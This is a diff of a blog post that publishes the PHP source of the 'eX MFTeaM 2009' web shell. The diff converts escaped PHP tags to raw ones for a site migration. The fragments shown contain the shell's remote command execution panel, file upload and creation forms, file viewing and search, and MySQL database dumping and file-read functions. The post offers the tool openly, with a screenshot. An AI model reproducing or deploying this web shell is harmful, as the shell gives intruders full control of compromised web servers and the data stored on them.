@@ -15,7 +15,7 @@ eX MFTeaM 2009 shell by By FakoMast3r, CopyRight MFTeaM.
 
 ### eX MFTeaM 2009 shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 ##########################################################
 ### eX MFTeaM 2009                    ###
 define('sh_ver'," By FakoMast3r");           ###
@@ -590,14 +590,14 @@ else {
   echo "&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;";
 }
 echo "\n&lt;/p&gt;\n";
-?&gt;
+?>
 &lt;div class=fright&gt;
 &lt;form method="POST"&gt;&lt;input type=hidden name=act value="ls"&gt;
-Directory: &lt;input type="text" name="d" size="50" value="&lt;?php echo $dispd; ?&gt;"&gt; &lt;input type=submit value="Go"&gt;
+Directory: &lt;input type="text" name="d" size="50" value="<?php echo $dispd; ?>"&gt; &lt;input type=submit value="Go"&gt;
 &lt;/form&gt;
 &lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;?php
+<?php
 /***********************/
 /** INFORMATION TABLE **/
 /***********************/
@@ -645,8 +645,8 @@ if ($act == "sql") {
   else {
     //Start left panel
     if (!empty($sql_db)) {
-      ?&gt;&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="&lt;?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;
-      &lt;?php
+      ?>&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;
+      <?php
       $result = mysql_list_tables($sql_db);
       if (!$result) {echo mysql_smarterror();}
       else {
@@ -657,21 +657,21 @@ if ($act == "sql") {
       }
     }
     else {
-      ?&gt;&lt;td width="1" height="100" valign="top"&gt;&lt;a href="&lt;?php echo $sql_surl; ?&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;
-      &lt;?php
+      ?>&lt;td width="1" height="100" valign="top"&gt;&lt;a href="<?php echo $sql_surl; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;
+      <?php
       $result = mysql_list_dbs($sql_sock);
       if (!$result) {echo mysql_smarterror();}
       else {
-        ?&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;select name="sql_db"&gt;
-        &lt;?php
+        ?>&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;select name="sql_db"&gt;
+        <?php
         $c = 0;
         $dbs = "";
         while ($row = mysql_fetch_row($result)) {$dbs .= "&lt;option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= "&gt;".$row[0]."&lt;/option&gt;"; $c++;}
         echo "&lt;option value=\"\"&gt;Databases (".$c.")&lt;/option&gt;";
         echo $dbs;
       }
-      ?&gt;&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;
-      &lt;?php
+      ?>&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;
+      <?php
     }
     //End left panel
     echo "&lt;/td&gt;&lt;td width=\"100%\"&gt;";
@@ -722,27 +722,27 @@ if ($act == "sql") {
         if ((!$submit) or ($sql_act)) {echo "&lt;table border=\"0\" width=\"100%\" height=\"1\"&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=\"".$sql_surl."\" method=\"POST\"&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\"sql_query\" cols=\"100\" rows=\"10\"&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"query\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"submit\" value=\"1\"&gt;&lt;input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"&gt; &lt;input type=\"submit\" value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";}
       }
       if (in_array($sql_act,$acts)) {
-        ?&gt;&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;
-        &lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
+        ?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;
+        &lt;form action="<?php echo $surl; ?>"&gt;
         &lt;input type="hidden" name="act" value="sql"&gt;
         &lt;input type="hidden" name="sql_act" value="newtbl"&gt;
-        &lt;input type="hidden" name="sql_db" value="&lt;?php echo htmlspecialchars($sql_db); ?&gt;"&gt;
-        &lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;
-        &lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;
-        &lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;
-        &lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;
+        &lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;
+        &lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;
+        &lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;
+        &lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;
+        &lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;
         &lt;input type="text" name="sql_newtbl" size="20"&gt;
         &lt;input type="submit" value="Create"&gt;
         &lt;/form&gt;&lt;/td&gt;
         &lt;td width="30%" height="1"&gt;&lt;b&gt;Dump DB:&lt;/b&gt;
-        &lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
+        &lt;form action="<?php echo $surl; ?>"&gt;
         &lt;input type="hidden" name="act" value="sql"&gt;
         &lt;input type="hidden" name="sql_act" value="dump"&gt;
-        &lt;input type="hidden" name="sql_db" value="&lt;?php echo htmlspecialchars($sql_db); ?&gt;"&gt;
-        &lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;
-        &lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;
-        &lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="dump_file" size="30" value="&lt;?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?&gt;"&gt;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-        &lt;?php
+        &lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;
+        &lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;
+        &lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;
+        &lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"&gt;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+        <?php
         if (!empty($sql_act)) {echo "&lt;hr size=\"1\" noshade&gt;";}
         if ($sql_act == "newtbl") {
           echo "&lt;b&gt;";
@@ -969,7 +969,7 @@ if ($act == "sql") {
   }
   else {
    $acts = array("","newdb","serverstatus","servervars","processes","getfile");
-   if (in_array($sql_act,$acts)) {?&gt;&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="sql_getfile" size="30" value="&lt;?php echo htmlspecialchars($sql_getfile); ?&gt;"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;?php }
+   if (in_array($sql_act,$acts)) {?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php }
    if (!empty($sql_act)) {
     echo "&lt;hr size=\"1\" noshade&gt;";
     if ($sql_act == "newdb") {
@@ -2566,31 +2566,31 @@ if ($act == "about") {
 }
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n";
 /*** COMMANDS PANEL ***/
-?&gt;
+?>
 &lt;div  class=bartitle&gt;&lt;b&gt;.: COMMANDS PANEL :.&lt;/b&gt;&lt;/div&gt;
 &lt;table class=mainpanel&gt;
 &lt;tr&gt;&lt;td align=right&gt;Command:&lt;/td&gt;
 &lt;td&gt;&lt;form method="POST"&gt;
     &lt;input type=hidden name=act value="cmd"&gt;
-    &lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
-    &lt;input type="text" name="cmd" size="100" value="&lt;?php echo htmlspecialchars($cmd); ?&gt;"&gt;
+    &lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;
+    &lt;input type="text" name="cmd" size="100" value="<?php echo htmlspecialchars($cmd); ?>"&gt;
     &lt;input type=hidden name="cmd_txt" value="1"&gt; &lt;input type=submit name=submit value="Execute"&gt;
     &lt;/form&gt;
 &lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td align=right&gt;Quick Commands:&lt;/td&gt;
 &lt;td&gt;&lt;form method="POST"&gt;
     &lt;input type=hidden name=act value="cmd"&gt;
-    &lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
+    &lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;
     &lt;input type=hidden name="cmd_txt" value="1"&gt;
     &lt;select name="cmd"&gt;
-    &lt;?php
+    <?php
     foreach ($cmdaliases as $als) {
       echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";
     }
     foreach ($cmdaliases2 as $als) {
       echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";
     }
-    ?&gt;
+    ?>
     &lt;/select&gt; &lt;input type=submit name=submit value="Execute"&gt;
     &lt;/form&gt;
 &lt;/td&gt;&lt;/tr&gt;
@@ -2598,12 +2598,12 @@ echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n";
 &lt;td&gt;&lt;form method="POST" enctype="multipart/form-data"&gt;
     &lt;input type=hidden name=act value="upload"&gt;
     &lt;input type=hidden name="miniform" value="1"&gt;
-    &lt;input type="file" name="uploadfile"&gt; &lt;input type=submit name=submit value="Upload"&gt; &lt;?php echo $wdt." Max size: ". @ini_get("upload_max_filesize")."B"; ?&gt;
+    &lt;input type="file" name="uploadfile"&gt; &lt;input type=submit name=submit value="Upload"&gt; <?php echo $wdt." Max size: ". @ini_get("upload_max_filesize")."B"; ?>
     &lt;/form&gt;
 &lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td align=right&gt;PHP Filesystem:&lt;/td&gt;
 &lt;td&gt;
-&lt;?php ###[ eX TriCkz ]### ?&gt;
+<?php ###[ eX TriCkz ]### ?>
 &lt;script language="javascript"&gt;
 function set_arg(txt1,txt2) {
   document.forms.fphpfsys.phpfsysfunc.value.selected = "Download";
@@ -2629,7 +2629,7 @@ function chg_arg(num,txt1,txt2) {
   document.forms.fphpfsys.A2.value = txt2 + ":";
 }
 &lt;/script&gt;
-&lt;?php
+<?php
   echo "&lt;form name=\"fphpfsys\" method=\"POST\"&gt;&lt;input type=hidden name=act value=\"phpfsys\"&gt;&lt;input type=hidden name=d value=\"$dispd\"&gt;\r\n".
        "&lt;select name=\"phpfsysfunc\"&gt;\r\n";
   foreach ($phpfsaliases as $als) {
@@ -2648,25 +2648,25 @@ function chg_arg(num,txt1,txt2) {
     echo "&lt;input type=button value=\"$e\" onclick=\"set_arg('$o[0]','$o[1]')\"&gt;\r\n";
   }
   echo "&lt;/form&gt;\r\n";
-?&gt;
+?>
 &lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td align=right&gt;Search File:&lt;/td&gt;
-&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="search"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
+&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="search"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;
     &lt;input type="text" name="search_name" size="29" value="(.*)"&gt; &lt;input type="checkbox" name="search_name_regexp" value="1" checked&gt; regexp &lt;input type=submit name=submit value="Search"&gt;
     &lt;/form&gt;
     &lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td align=right&gt;Create File:&lt;/td&gt;
-&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkfile"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type=hidden name="ft" value="edit"&gt;
-    &lt;input type="text" name="mkfile" size="70" value="&lt;?php echo $dispd; ?&gt;"&gt; &lt;input type="checkbox" name="overwrite" value="1" checked&gt; Overwrite &lt;input type=submit value="Create"&gt; &lt;?php echo $wdt; ?&gt;
+&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkfile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type=hidden name="ft" value="edit"&gt;
+    &lt;input type="text" name="mkfile" size="70" value="<?php echo $dispd; ?>"&gt; &lt;input type="checkbox" name="overwrite" value="1" checked&gt; Overwrite &lt;input type=submit value="Create"&gt; <?php echo $wdt; ?>
     &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td align=right&gt;View File:&lt;/td&gt;
-&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="gofile"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
-    &lt;input type="text" name="f" size="70" value="&lt;?php echo $dispd; ?&gt;"&gt; &lt;input type=submit value="View"&gt;
+&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="gofile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;
+    &lt;input type="text" name="f" size="70" value="<?php echo $dispd; ?>"&gt; &lt;input type=submit value="View"&gt;
     &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;/table&gt;
-&lt;?php footer(); ?&gt;
+<?php footer(); ?>
 &lt;/body&gt;&lt;/html&gt;
-&lt;?php
+<?php
 
 ########################################
 ### exSh CORE FUNCTIONS ###
@@ -3121,8 +3121,8 @@ function footer() {
   echo "&lt;div class=bartitle colspan=2&gt;&lt;font size=1 color=#00FF00&gt; By FakoMast3r,   2009 Midnightcr3w, Generated: ".round(getmicrotime()-starttime,4)." seconds&lt;/font&gt;&lt;/div&gt;";
 }
 chdir($lastdir); exshexit();
-?&gt;
-</pre>
+?>
+{% endhighlight %}
 
 A screenshot of the MFTeaM shell:  
 <figure id="attachment_395" style="width: 604px;" class="wp-caption aligncenter">[<img src="{{ site.baseurl }}/wp-content/uploads/2014/03/MFTeaM-1024x575.png" alt="MFTeaM shell screenshot" width="604" height="339" class="size-large wp-image-395" />][1]<figcaption class="wp-caption-text">MFTeaM shell screenshot</figcaption></figure>
